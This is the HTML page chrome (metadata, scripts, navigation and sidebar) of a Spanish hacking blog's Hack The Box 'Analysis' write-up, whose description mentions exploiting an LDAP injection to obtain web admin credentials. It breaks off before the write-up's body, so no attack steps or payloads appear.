<!DOCTYPE html><html class="transition bg-[var(--page-bg)] md:text-[16px] text-[14px]" data-astro-cid-sckkx6r4 lang=en style=--configHue:285><head><title>Analysis HTB Writeup - Mil4ne - Hacking Blog</title><meta charset=UTF-8><meta content="En esta maquina explotamos un LDAP Injection a un parametro name, para conseguir crendeciales de admin de la web." name=description><meta content=Mil4ne name=author><meta content="Mil4ne - Hacking Blog" property=og:site_name><meta content=https://fuwari.vercel.app/posts/analysis/ property=og:url><meta content="Analysis HTB Writeup - Mil4ne - Hacking Blog" property=og:title><meta content="En esta maquina explotamos un LDAP Injection a un parametro name, para conseguir crendeciales de admin de la web." property=og:description><meta content=summary_large_image name=twitter:card><meta content=https://fuwari.vercel.app/posts/analysis/ property=twitter:url><meta content="Analysis HTB Writeup - Mil4ne - Hacking Blog" name=twitter:title><meta content="En esta maquina explotamos un LDAP Injection a un parametro name, para conseguir crendeciales de admin de la web." name=twitter:description><meta content="width=device-width" name=viewport><meta content="Astro v4.12.2" name=generator><link href=/favicon/ico.png rel=icon media="(prefers-color-scheme: light)" sizes=32x32><script>!function(){switch(localStorage.getItem("theme")||"auto"){case"light":document.documentElement.classList.remove("dark");break;case"dark":document.documentElement.classList.add("dark");break;case"auto":window.matchMedia("(prefers-color-scheme: dark)").matches?document.documentElement.classList.add("dark"):document.documentElement.classList.remove("dark")}}()</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Analysis HTB Writeup","description":"En esta maquina explotamos un LDAP Injection a un parametro name, para conseguir crendeciales de admin de la web.","keywords":["Hard","Windows"],"author":{"@type":"Person","name":"Mil4ne","url":"https://fuwari.vercel.app/"},"datePublished":"2024-06-21"}</script><link href=https://cdn.staticfile.net/KaTeX/0.16.9/katex.min.css rel=stylesheet crossorigin=anonymous integrity=sha384-n8MVd4RsNIU0tAv4ct0nTaAbDJwPJzDEaqSD1odI+WdtXRGWt2kTvGFasHpSy3SV><link href=https://fuwari.vercel.app/rss.xml rel=alternate title=Mil4ne type=application/rss+xml><link href=/_astro/hoisted.DwNyjBsW.css rel=stylesheet><style>#post-container :first-child{animation-delay:calc(var(--content-delay) + 0ms)}#post-container :nth-child(2){animation-delay:calc(var(--content-delay) + 50ms)}#post-container :nth-child(3){animation-delay:calc(var(--content-delay) + .1s)}#post-container :nth-child(4){animation-delay:calc(var(--content-delay) + 175ms)}#post-container :nth-child(5){animation-delay:calc(var(--content-delay) + .25s)}#post-container :nth-child(6){animation-delay:calc(var(--content-delay) + 325ms)}</style><link href=/_astro/_page_.DqgmXnqg.css rel=stylesheet><link href=/_astro/about.CcgST-W0.css rel=stylesheet><link href=/_astro/_page_.CKcwgKCg.css rel=stylesheet><link href=/_astro/_category_.Dr5SI4UX.css rel=stylesheet><style>#display-setting.svelte-3akcb9 input[type=range].svelte-3akcb9{-webkit-appearance:none;height:1.5rem;background-image:var(--color-selection-bar);transition:background-image .15s ease-in-out}#display-setting.svelte-3akcb9 .svelte-3akcb9::-webkit-slider-thumb{-webkit-appearance:none;height:1rem;width:.5rem;border-radius:.125rem;background:#ffffffb3;box-shadow:none}#display-setting.svelte-3akcb9 .svelte-3akcb9::-webkit-slider-thumb:hover{background:#fffc}#display-setting.svelte-3akcb9 .svelte-3akcb9::-webkit-slider-thumb:active{background:#fff9}#display-setting.svelte-3akcb9 .svelte-3akcb9::-moz-range-thumb{-webkit-appearance:none;height:1rem;width:.5rem;border-radius:.125rem;border-width:0;background:#ffffffb3;box-shadow:none}#display-setting.svelte-3akcb9 .svelte-3akcb9::-moz-range-thumb:hover{background:#fffc}#display-setting.svelte-3akcb9 .svelte-3akcb9::-moz-range-thumb:active{background:#fff9}#display-setting.svelte-3akcb9.svelte-3akcb9::-ms-thumb{-webkit-appearance:none;height:1rem;width:.5rem;border-radius:.125rem;background:#ffffffb3;box-shadow:none}#display-setting.svelte-3akcb9.svelte-3akcb9::-ms-thumb:hover{background:#fffc}#display-setting.svelte-3akcb9.svelte-3akcb9::-ms-thumb:active{background:#fff9}</style><script type=module src=/_astro/hoisted.Ba9v_GuF.js></script><script type=module src=/_astro/page.0NdQ2tHG.js></script></head><body class="transition min-h-screen" data-astro-cid-sckkx6r4 style=--configHue:285><div id=config-carrier data-hue=285></div><div><div class="w-full transition-all absolute duration-700" id=banner-wrapper style=--configHue:285 data-astro-cid-sckkx6r4><div class="overflow-hidden relative h-full hidden object-cover" id=boxtest><div class="transition absolute pointer-events-none bg-opacity-50 dark:bg-black/10 inset-0"></div><img alt="Banner image of the blog" decoding=async height=1369 loading=lazy src=/_astro/demo-banner.WD4SMgz__nlqjd.webp width=1920 class="w-full h-full object-cover" style=object-position:center></div></div><div class="relative mx-auto gap-4 grid grid-cols-[17.5rem_auto] grid-rows-[auto_auto_1fr_auto] lg:grid-rows-[auto_1fr_auto] max-w-[var(--page-width)] md:px-4 min-h-screen px-0"><div class="relative col-span-2 duration-700 grid-rows-1 transition-all" id=top-row><div class="onload-animation sticky top-0 z-50" id=navbar><div class="transition absolute -top-8 bg-[var(--card-bg)] h-8 left-0 right-0"></div><div class="flex items-center justify-between card-base h-[4.5rem] max-w-[var(--page-width)] mx-auto overflow-visible px-4 rounded-t-none"><a href=/ class="rounded-lg btn-plain scale-animation active:scale-95 font-bold px-5 h-[3.25rem]"><div class="flex items-center flex-row text-[var(--primary)] text-md"><svg data-icon=material-symbols:home-outline-rounded height=1em viewBox="0 0 24 24" width=1em class="text-[1.75rem] mb-1 mr-2"><symbol id=ai:material-symbols:home-outline-rounded><path d="M6 19h3v-5q0-.425.288-.712T10 13h4q.425 0 .713.288T15 14v5h3v-9l-6-4.5L6 10zm-2 0v-9q0-.475.213-.9t.587-.7l6-4.5q.525-.4 1.2-.4t1.2.4l6 4.5q.375.275.588.7T20 10v9q0 .825-.588 1.413T18 21h-4q-.425 0-.712-.288T13 20v-5h-2v5q0 .425-.288.713T10 21H6q-.825 0-1.412-.587T4 19m8-6.75" fill=currentColor /></symbol><use xlink:href=#ai:material-symbols:home-outline-rounded></use></svg> Mil4ne - Hacking Blog</div></a><div class="md:flex hidden"><a href=/ class="rounded-lg btn-plain scale-animation active:scale-95 font-bold px-5 h-11" aria-label=Inicio><div class="flex items-center">Inicio</div></a><a href=/archive/ class="rounded-lg btn-plain scale-animation active:scale-95 font-bold px-5 h-11" aria-label=Archivos><div class="flex items-center">Archivos</div></a><a href=/proyectos/ class="rounded-lg btn-plain scale-animation active:scale-95 font-bold px-5 h-11" aria-label=Proyectos><div class="flex items-center">Proyectos</div></a><a href=/about/ class="rounded-lg btn-plain scale-animation active:scale-95 font-bold px-5 h-11" aria-label="Sobre mi"><div class="flex items-center">Sobre mi</div></a></div><div class=flex><style>astro-island,astro-slot,astro-static-slot{display:contents}</style><script>(self.Astro||(self.Astro={})).load=async t=>{await(await t())()},window.dispatchEvent(new Event("astro:load")),(()=>{var t=Object.defineProperty,e=(e,r,n)=>((e,r,n)=>r in e?t(e,r,{enumerable:!0,configurable:!0,writable:!0,value:n}):e[r]=n)(e,"symbol"!=typeof r?r+"":r,n);{let t={0:t=>s(t),1:t=>n(t),2:t=>new RegExp(t),3:t=>new Date(t),4:t=>new Map(n(t)),5:t=>new Set(n(t)),6:t=>BigInt(t),7:t=>new URL(t),8:t=>new Uint8Array(t),9:t=>new Uint16Array(t),10:t=>new Uint32Array(t)},r=e=>{let[r,n]=e;return r in t?t[r](n):void 0},n=t=>t.map(r),s=t=>"object"!=typeof t||null===t?t:Object.fromEntries(Object.entries(t).map((([t,e])=>[t,r(e)])));class i extends HTMLElement{constructor(){super(...arguments),e(this,"Component"),e(this,"hydrator"),e(this,"hydrate",(async()=>{var t;if(!this.hydrator||!this.isConnected)return;let e=null==(t=this.parentElement)?void 0:t.closest("astro-island[ssr]");if(e)return void e.addEventListener("astro:hydrate",this.hydrate,{once:!0});let r,n=this.querySelectorAll("astro-slot"),i={},o=this.querySelectorAll("template[data-astro-template]");for(let t of o){let e=t.closest(this.tagName);null!=e&&e.isSameNode(this)&&(i[t.getAttribute("data-astro-template")||"default"]=t.innerHTML,t.remove())}for(let t of n){let e=t.closest(this.tagName);null!=e&&e.isSameNode(this)&&(i[t.getAttribute("name")||"default"]=t.innerHTML)}try{r=this.hasAttribute("props")?s(JSON.parse(this.getAttribute("props"))):{}}catch(t){let e=this.getAttribute("component-url")||"<unknown>",r=this.getAttribute("component-export");throw r&&(e+=` (export ${r})`),console.error(`[hydrate] Error parsing props for component ${e}`,this.getAttribute("props"),t),t}await this.hydrator(this)(this.Component,r,i,{client:this.getAttribute("client")}),this.removeAttribute("ssr"),this.dispatchEvent(new CustomEvent("astro:hydrate"))})),e(this,"unmount",(()=>{this.isConnected||this.dispatchEvent(new CustomEvent("astro:unmount"))}))}disconnectedCallback(){document.removeEventListener("astro:after-swap",this.unmount),document.addEventListener("astro:after-swap",this.unmount,{once:!0})}connectedCallback(){if(this.hasAttribute("await-children")&&"interactive"!==document.readyState&&"complete"!==document.readyState){let t=()=>{document.removeEventListener("DOMContentLoaded",t),e.disconnect(),this.childrenConnectedCallback()},e=new MutationObserver((()=>{var e;(null==(e=this.lastChild)?void 0:e.nodeType)===Node.COMMENT_NODE&&"astro:end"===this.lastChild.nodeValue&&(this.lastChild.remove(),t())}));e.observe(this,{childList:!0}),document.addEventListener("DOMContentLoaded",t)}else this.childrenConnectedCallback()}async childrenConnectedCallback(){let t=this.getAttribute("before-hydration-url");t&&await import(t),this.start()}async start(){let t=JSON.parse(this.getAttribute("opts")),e=this.getAttribute("client");if(void 0!==Astro[e])try{await Astro[e]((async()=>{let t=this.getAttribute("renderer-url"),[e,{default:r}]=await Promise.all([import(this.getAttribute("component-url")),t?import(t):()=>()=>{}]),n=this.getAttribute("component-export")||"default";if(n.includes(".")){this.Component=e;for(let t of n.split("."))this.Component=this.Component[t]}else this.Component=e[n];return this.hydrator=r,this.hydrate}),t,this)}catch(t){console.error(`[astro-island] Error hydrating ${this.getAttribute("component-url")}`,t)}else window.addEventListener(`astro:${e}`,(()=>this.start()),{once:!0})}attributeChangedCallback(){this.hydrate()}}e(i,"observedAttributes",["props"]),customElements.get("astro-island")||customElements.define("astro-island",i)}})()</script><astro-island await-children="" client=load component-export=default component-url=/_astro/Search.BUIYXvwE.js opts={&quot;name&quot;:&quot;Search&quot;,&quot;value&quot;:true} props={} renderer-url=/_astro/client.Cx1FBVJX.js ssr="" uid=L1Us7><div class="rounded-lg items-center bg-black/[0.04] dark:bg-white/5 dark:focus-within:bg-white/10 dark:hover:bg-white/10 focus-within:bg-black/[0.06] h-11 hidden hover:bg-black/[0.06] lg:flex mr-2 transition-all" id=search-bar><astro-slot name=search-icon><svg data-icon=material-symbols:search height=1em viewBox="0 0 24 24" width=1em class="transition absolute pointer-events-none dark:text-white/30 ml-3 my-auto text-[1.25rem] text-black/30" slot=search-icon><symbol id=ai:material-symbols:search><path d="m19.6 21l-6.3-6.3q-.75.6-1.725.95T9.5 16q-2.725 0-4.612-1.888T3 9.5t1.888-4.612T9.5 3t4.613 1.888T16 9.5q0 1.1-.35 2.075T14.7 13.3l6.3 6.3zM9.5 14q1.875 0 3.188-1.312T14 9.5t-1.312-3.187T9.5 5T6.313 6.313T5 9.5t1.313 3.188T9.5 14" fill=currentColor /></symbol><use xlink:href=#ai:material-symbols:search></use></svg></astro-slot><input class="text-sm bg-transparent dark:text-white/50 focus:w-60 outline-0 pl-10 text-black/50 active:w-60 h-full transition-all w-40" placeholder="$ Grep" value=""></div><button class="rounded-lg btn-plain scale-animation h-11 active:scale-90 w-11 lg:hidden" aria-label="Search Panel" id=search-switch><astro-slot name=search-switch><svg data-icon=material-symbols:search height=1em viewBox="0 0 24 24" width=1em class=text-[1.25rem] slot=search-switch><use xlink:href=#ai:material-symbols:search></use></svg></astro-slot></button><div class="absolute float-panel-closed float-panel right-4 left-4 md:left-[unset] md:w-[30rem] p-2 rounded-2xl search-panel shadow-2xl top-20" id=search-panel><div class="flex items-center relative bg-black/[0.04] dark:bg-white/5 dark:focus-within:bg-white/10 dark:hover:bg-white/10 focus-within:bg-black/[0.06] h-11 hover:bg-black/[0.06] lg:hidden rounded-xl transition-all" id=search-bar-inside><astro-slot name=search-icon><svg data-icon=material-symbols:search height=1em viewBox="0 0 24 24" width=1em class="transition absolute pointer-events-none dark:text-white/30 ml-3 my-auto text-[1.25rem] text-black/30" slot=search-icon><symbol id=ai:material-symbols:search><path d="m19.6 21l-6.3-6.3q-.75.6-1.725.95T9.5 16q-2.725 0-4.612-1.888T3 9.5t1.888-4.612T9.5 3t4.613 1.888T16 9.5q0 1.1-.35 2.075T14.7 13.3l6.3 6.3zM9.5 14q1.875 0 3.188-1.312T14 9.5t-1.312-3.187T9.5 5T6.313 6.313T5 9.5t1.313 3.188T9.5 14" fill=currentColor /></symbol><use xlink:href=#ai:material-symbols:search></use></svg></astro-slot><input class="text-sm bg-transparent dark:text-white/50 focus:w-60 outline-0 pl-10 text-black/50 absolute inset-0" placeholder=Search value=""></div></div><template data-astro-template=arrow-icon><svg data-icon=fa6-solid:chevron-right height=1em viewBox="0 0 320 512" width=0.63em class="transition text-[var(--primary)] my-auto text=[0.75rem] translate-x-0.5" slot=arrow-icon><symbol id=ai:fa6-solid:chevron-right><path d="M310.6 233.4c12.5 12.5 12.5 32.8 0 45.3l-192 192c-12.5 12.5-32.8 12.5-45.3 0s-12.5-32.8 0-45.3L242.7 256L73.4 86.6c-12.5-12.5-12.5-32.8 0-45.3s32.8-12.5 45.3 0l192 192z" fill=currentColor /></symbol><use xlink:href=#ai:fa6-solid:chevron-right></use></svg></template></astro-island><astro-island await-children="" client=load component-export=default component-url=/_astro/LightDarkSwitch.DtW2iCPh.js opts={&quot;name&quot;:&quot;LightDarkSwitch&quot;,&quot;value&quot;:true} props={} renderer-url=/_astro/client.Cx1FBVJX.js ssr="" uid=Z1AFJ4s><div class="relative z-50" role=menu tabindex=-1><button class="rounded-lg btn-plain scale-animation h-11 active:scale-90 w-11 relative" aria-label="Light/Dark Mode" id=scheme-switch role=menuitem><div class="absolute opacity-0"></div><div class="absolute opacity-0"></div><div class=absolute></div></button><div class="transition absolute -right-2 float-panel-closed hidden lg:block pt-5 top-11" id=light-dark-panel><div class="card-base float-panel p-2"><button class="transition flex items-center rounded-lg active:scale-95 btn-plain font-medium h-9 justify-start px-3 scale-animation w-full whitespace-nowrap mb-0.5">Claro</button> <button class="transition flex items-center rounded-lg active:scale-95 btn-plain font-medium h-9 justify-start px-3 scale-animation w-full whitespace-nowrap mb-0.5">Oscuro</button> <button class="transition flex items-center rounded-lg active:scale-95 btn-plain font-medium h-9 justify-start px-3 scale-animation w-full whitespace-nowrap current-theme-btn">Sistema</button></div></div></div></astro-island><button class="rounded-lg btn-plain scale-animation h-11 active:scale-90 w-11 md:hidden" aria-label=Menu id=nav-menu-switch name="Nav Menu"><svg data-icon=material-symbols:menu-rounded height=1em viewBox="0 0 24 24" width=1em class=text-[1.25rem]><symbol id=ai:material-symbols:menu-rounded><path d="M4 18q-.425 0-.712-.288T3 17t.288-.712T4 16h16q.425 0 .713.288T21 17t-.288.713T20 18zm0-5q-.425 0-.712-.288T3 12t.288-.712T4 11h16q.425 0 .713.288T21 12t-.288.713T20 13zm0-5q-.425 0-.712-.288T3 7t.288-.712T4 6h16q.425 0 .713.288T21 7t-.288.713T20 8z" fill=currentColor /></symbol><use xlink:href=#ai:material-symbols:menu-rounded></use></svg></button></div><div class="absolute float-panel-closed float-panel right-4 fixed px-2 py-2 transition-all" id=nav-menu-panel><a href=/ class="transition flex items-center rounded-lg active:bg-[var(--btn-plain-bg-active)] gap-8 group hover:bg-[var(--btn-plain-bg-hover)] justify-between pl-3 pr-1 py-2"><div class="transition font-bold dark:text-white/75 text-black/75 group-active:text-[var(--primary)] group-hover:text-[var(--primary)]">Inicio</div><svg data-icon=material-symbols:chevron-right-rounded height=1em viewBox="0 0 24 24" width=1em class="transition text-[1.25rem] text-[var(--primary)]"><use xlink:href=#ai:material-symbols:chevron-right-rounded></use></svg> </a><a href=/archive/ class="transition flex items-center rounded-lg active:bg-[var(--btn-plain-bg-active)] gap-8 group hover:bg-[var(--btn-plain-bg-hover)] justify-between pl-3 pr-1 py-2"><div class="transition font-bold dark:text-white/75 text-black/75 group-active:text-[var(--primary)] group-hover:text-[var(--primary)]">Archivos</div><svg data-icon=material-symbols:chevron-right-rounded height=1em viewBox="0 0 24 24" width=1em class="transition text-[1.25rem] text-[var(--primary)]"><use xlink:href=#ai:material-symbols:chevron-right-rounded></use></svg> </a><a href=/proyectos/ class="transition flex items-center rounded-lg active:bg-[var(--btn-plain-bg-active)] gap-8 group hover:bg-[var(--btn-plain-bg-hover)] justify-between pl-3 pr-1 py-2"><div class="transition font-bold dark:text-white/75 text-black/75 group-active:text-[var(--primary)] group-hover:text-[var(--primary)]">Proyectos</div><svg data-icon=material-symbols:chevron-right-rounded height=1em viewBox="0 0 24 24" width=1em class="transition text-[1.25rem] text-[var(--primary)]"><use xlink:href=#ai:material-symbols:chevron-right-rounded></use></svg> </a><a href=/about/ class="transition flex items-center rounded-lg active:bg-[var(--btn-plain-bg-active)] gap-8 group hover:bg-[var(--btn-plain-bg-hover)] justify-between pl-3 pr-1 py-2"><div class="transition font-bold dark:text-white/75 text-black/75 group-active:text-[var(--primary)] group-hover:text-[var(--primary)]">Sobre mi</div><svg data-icon=material-symbols:chevron-right-rounded height=1em viewBox="0 0 24 24" width=1em class="transition text-[1.25rem] text-[var(--primary)]"><use xlink:href=#ai:material-symbols:chevron-right-rounded></use></svg></a></div><script>(self.Astro||(self.Astro={})).only=async t=>{await(await t())()},window.dispatchEvent(new Event("astro:only"))</script><astro-island await-children="" client=only component-export=default component-url=/_astro/DisplaySettings.HGt80fuC.js opts={&quot;name&quot;:&quot;DisplaySettings&quot;,&quot;value&quot;:&quot;svelte&quot;} props={} renderer-url=/_astro/client.Cx1FBVJX.js ssr="" uid=Z246wRT><template data-astro-template=restore-icon><svg data-icon=fa6-solid:arrow-rotate-left height=1em viewBox="0 0 512 512" width=1em class=text-[0.875rem] slot=restore-icon><symbol id=ai:fa6-solid:arrow-rotate-left><path d="M125.7 160H176c17.7 0 32 14.3 32 32s-14.3 32-32 32H48c-17.7 0-32-14.3-32-32V64c0-17.7 14.3-32 32-32s32 14.3 32 32v51.2l17.6-17.6c87.5-87.5 229.3-87.5 316.8 0s87.5 229.3 0 316.8s-229.3 87.5-316.8 0c-12.5-12.5-12.5-32.8 0-45.3s32.8-12.5 45.3 0c62.5 62.5 163.8 62.5 226.3 0s62.5-163.8 0-226.3s-163.8-62.5-226.3 0z" fill=currentColor /></symbol><use xlink:href=#ai:fa6-solid:arrow-rotate-left></use></svg></template></astro-island></div></div><script>!async function(){const i=await import("/pagefind/pagefind.js");await i.options({excerptLength:20}),i.init(),window.pagefind=i,i.search("")}()</script></div><div class="w-full col-span-2 lg:col-span-1 lg:max-w-[17.5rem] lg:row-end-3 lg:row-start-2 onload-animation row-end-4 row-start-3" id=sidebar><div class="flex w-full gap-4 flex-col mb-4"><div class="card-base p-3"><a href=/about/ class="overflow-hidden relative rounded-xl active:scale-95 block group lg:max-w-none lg:mt-0 lg:mx-0 max-w-[240px] mb-3 mt-1 mx-auto" aria-label="Go to About Page"><div class="transition flex items-center justify-center absolute group-active:bg-black/50 group-hover:bg-black/30 h-full pointer-events-none w-full z-50"><svg data-icon=fa6-regular:address-card height=1em viewBox="0 0 576 512" width=1.13em class="transition group-hover:opacity-100 group-hover:scale-100 opacity-0 scale-90 text-5xl text-white"><symbol id=ai:fa6-regular:address-card><path d="M512 80c8.8 0 16 7.2 16 16v320c0 8.8-7.2 16-16 16H64c-8.8 0-16-7.2-16-16V96c0-8.8 7.2-16 16-16zM64 32C28.7 32 0 60.7 0 96v320c0 35.3 28.7 64 64 64h448c35.3 0 64-28.7 64-64V96c0-35.3-28.7-64-64-64zm144 224a64 64 0 1 0 0-128a64 64 0 1 0 0 128m-32 32c-44.2 0-80 35.8-80 80c0 8.8 7.2 16 16 16h192c8.8 0 16-7.2 16-16c0-44.2-35.8-80-80-80zm200-144c-13.3 0-24 10.7-24 24s10.7 24 24 24h80c13.3 0 24-10.7 24-24s-10.7-24-24-24zm0 96c-13.3 0-24 10.7-24 24s10.7 24 24 24h80c13.3 0 24-10.7 24-24s-10.7-24-24-24z" fill=currentColor /></symbol><use xlink:href=#ai:fa6-regular:address-card></use></svg></div><div class="overflow-hidden relative h-full lg:mt-0 lg:w-full mx-auto"><div class="transition absolute pointer-events-none bg-opacity-50 dark:bg-black/10 inset-0"></div><img alt="Profile Image of the Author" decoding=async height=500 loading=lazy src=/_astro/se.C2ColD85_Z1J9eVM.webp width=500 class="w-full h-full object-cover" style=object-position:center></div></a><div class=px-2><div class="transition font-bold dark:text-neutral-50 mb-1 text-center text-xl">Mil4ne</div><div class="transition mb-2 bg-[var(--primary)] h-1 mx-auto rounded-full w-5"></div><div class="transition text-center mb-2.5 text-neutral-400">eJPTv2 - RoadToCPTS</div><div class="flex gap-2 justify-center mb-1"><a href=https://www.linkedin.com/in/mil4ne/ class="rounded-lg btn-regular active:scale-90 h-10 w-10" aria-label=Linkedin rel=me target=_blank><svg data-icon=fa6-brands:linkedin height=1em viewBox="0 0 448 512" width=0.88em class=text-[1.5rem]><symbol id=ai:fa6-brands:linkedin><path d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3M135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5c0 21.3-17.2 38.5-38.5 38.5m282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7c-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5c67.2 0 79.7 44.3 79.7 101.9z" fill=currentColor /></symbol><use xlink:href=#ai:fa6-brands:linkedin></use></svg> </a><a href=https://app.hackthebox.com/profile/1022508 class="rounded-lg btn-regular active:scale-90 h-10 w-10" aria-label=Steam rel=me target=_blank><svg data-icon=mdi:cube height=1em viewBox="0 0 24 24" width=1em class=text-[1.5rem]><symbol id=ai:mdi:cube><path d="M21 16.5c0 .38-.21.71-.53.88l-7.9 4.44c-.16.12-.36.18-.57.18s-.41-.06-.57-.18l-7.9-4.44A.99.99 0 0 1 3 16.5v-9c0-.38.21-.71.53-.88l7.9-4.44c.16-.12.36-.18.57-.18s.41.06.57.18l7.9 4.44c.32.17.53.5.53.88zM12 4.15L6.04 7.5L12 10.85l5.96-3.35z" fill=currentColor /></symbol><use xlink:href=#ai:mdi:cube></use></svg> </a><a href=https://github.com/mil4ne class="rounded-lg btn-regular active:scale-90 h-10 w-10" aria-label=GitHub rel=me target=_blank><svg data-icon=fa6-brands:github height=1em viewBox="0 0 496 512" width=0.97em class=text-[1.5rem]><symbol id=ai:fa6-brands:github><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6c-3.3.3-5.6-1.3-5.6-3.6c0-2 2.3-3.6 5.2-3.6c3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9c2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9c.3 2 2.9 3.3 5.9 2.6c2.9-.7 4.9-2.6 4.6-4.6c-.3-1.9-3-3.2-5.9-2.9M244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2c12.8 2.3 17.3-5.6 17.3-12.1c0-6.2-.3-40.4-.3-61.4c0 0-70 15-84.7-29.8c0 0-11.4-29.1-27.8-36.6c0 0-22.9-15.7 1.6-15.4c0 0 24.9 2 38.6 25.8c21.9 38.6 58.6 27.5 72.9 20.9c2.3-16 8.8-27.1 16-33.7c-55.9-6.2-112.3-14.3-112.3-110.5c0-27.5 7.6-41.3 23.6-58.9c-2.6-6.5-11.1-33.3 2.6-67.9c20.9-6.5 69 27 69 27c20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27c13.7 34.7 5.2 61.4 2.6 67.9c16 17.7 25.8 31.5 25.8 58.9c0 96.5-58.9 104.2-114.8 110.5c9.2 7.9 17 22.9 17 46.4c0 33.7-.3 75.4-.3 83.6c0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252C496 113.3 383.5 8 244.8 8M97.2 352.9c-1.3 1-1 3.3.7 5.2c1.6 1.6 3.9 2.3 5.2 1c1.3-1 1-3.3-.7-5.2c-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9c1.6 1 3.6.7 4.3-.7c.7-1.3-.3-2.9-2.3-3.9c-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2c2.3 2.3 5.2 2.6 6.5 1c1.3-1.3.7-4.3-1.3-6.2c-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2c-1.4-2.3-4-3.3-5.6-2" fill=currentColor /></symbol><use xlink:href=#ai:fa6-brands:github></use></svg></a></div></div></div></div><div class="flex w-full gap-4 flex-col top-4 top-4 sticky"><widget-layout class="onload-animation card-base pb-4" data-astro-cid-ucso7hve data-id=categories data-is-collapsed=false style=animation-delay:150ms;--collapsedHeight:7.5rem><div class="transition font-bold before:absolute before:bg-[var(--primary)] before:rounded-md before:h-4 before:left-[-16px] before:top-[5.5px] before:w-1 dark:text-neutral-100 mb-2 ml-8 mt-4 relative text-lg text-neutral-900" style=--collapsedHeight:7.5rem data-astro-cid-ucso7hve>Categorias</div><div class="overflow-hidden collapse-wrapper px-4" id=categories style=--collapsedHeight:7.5rem data-astro-cid-ucso7hve><a href=/archive/category/Certificaciones/ aria-label="View all posts in the Certificaciones category"><button class="rounded-lg active:bg-[var(--btn-plain-bg-active)] hover:bg-[var(--btn-plain-bg-hover)] bg-none dark:hover:text-[var(--primary)] dark:text-neutral-300 h-10 hover:pl-3 hover:text-[var(--primary)] pl-2 text-neutral-700 transition-all w-full"><div class="flex items-center justify-between mr-2 relative"><div class="overflow-hidden overflow-ellipsis whitespace-nowrap text-left">Certificaciones</div><div class="transition flex items-center rounded-lg bg-[oklch(0.95_0.025_var(--hue))] dark:bg-[var(--primary)] dark:text-[var(--deep-text)] font-bold h-7 justify-center min-w-[2rem] ml-4 text-[var(--btn-content)] text-sm">1</div></div></button> </a><a href=/archive/category/HackTheBox/ aria-label="View all posts in the HackTheBox category"><button class="rounded-lg active:bg-[var(--btn-plain-bg-active)] hover:bg-[var(--btn-plain-bg-hover)] bg-none dark:hover:text-[var(--primary)] dark:text-neutral-300 h-10 hover:pl-3 hover:text-[var(--primary)] pl-2 text-neutral-700 transition-all w-full"><div class="flex items-center justify-between mr-2 relative"><div class="overflow-hidden overflow-ellipsis whitespace-nowrap text-left">HackTheBox</div><div class="transition flex items-center rounded-lg bg-[oklch(0.95_0.025_var(--hue))] dark:bg-[var(--primary)] dark:text-[var(--deep-text)] font-bold h-7 justify-center min-w-[2rem] ml-4 text-[var(--btn-content)] text-sm">20</div></div></button></a></div></widget-layout><widget-layout class="onload-animation card-base pb-4" data-astro-cid-ucso7hve data-id=tags data-is-collapsed=false style=animation-delay:.2s;--collapsedHeight:7.5rem><div class="transition font-bold before:absolute before:bg-[var(--primary)] before:rounded-md before:h-4 before:left-[-16px] before:top-[5.5px] before:w-1 dark:text-neutral-100 mb-2 ml-8 mt-4 relative text-lg text-neutral-900" style=--collapsedHeight:7.5rem data-astro-cid-ucso7hve>Tags</div><div class="overflow-hidden collapse-wrapper px-4" id=tags style=--collapsedHeight:7.5rem data-astro-cid-ucso7hve><div class="flex flex-wrap gap-2"><a href=/archive/tag/certs/ class="rounded-lg btn-regular h-8 px-3 text-sm" aria-label="View all posts with the certs tag">certs </a><a href=/archive/tag/Easy/ class="rounded-lg btn-regular h-8 px-3 text-sm" aria-label="View all posts with the Easy tag">Easy </a><a href=/archive/tag/Hard/ class="rounded-lg btn-regular h-8 px-3 text-sm" aria-label="View all posts with the Hard tag">Hard </a><a href=/archive/tag/Insane/ class="rounded-lg btn-regular h-8 px-3 text-sm" aria-label="View all posts with the Insane tag">Insane </a><a href=/archive/tag/Linux/ class="rounded-lg btn-regular h-8 px-3 text-sm" aria-label="View all posts with the Linux tag">Linux </a><a href=/archive/tag/Medium/ class="rounded-lg btn-regular h-8 px-3 text-sm" aria-label="View all posts with the Medium tag">Medium </a><a href=/archive/tag/Windows/ class="rounded-lg btn-regular h-8 px-3 text-sm" aria-label="View all posts with the Windows tag">Windows</a></div></div></widget-layout></div></div><div class="overflow-hidden onload-animation col-span-2 lg:col-span-1 row-end-3 row-start-2" id=content-wrapper><main class=transition-swup-fade id=swup-container><div class="flex w-full mb-4 overflow-hidden relative rounded-[var(--radius-large)]"><div class="w-full relative card-base md:px-9 pb-4 pt-6 px-6 z-10" id=post-container><div class="transition flex dark:text-white/30 flex-row gap-5 mb-3 onload-animation text-black/30"><div class="flex items-center flex-row"><div class="transition flex items-center justify-center bg-black/5 dark:bg-white/10 dark:text-white/50 h-6 mr-2 rounded-md text-black/50 w-6"><svg data-icon=material-symbols:notes-rounded height=1em viewBox="0 0 24 24" width=1em><symbol id=ai:material-symbols:notes-rounded><path d="M4 18q-.425 0-.712-.288T3 17t.288-.712T4 16h10q.425 0 .713.288T15 17t-.288.713T14 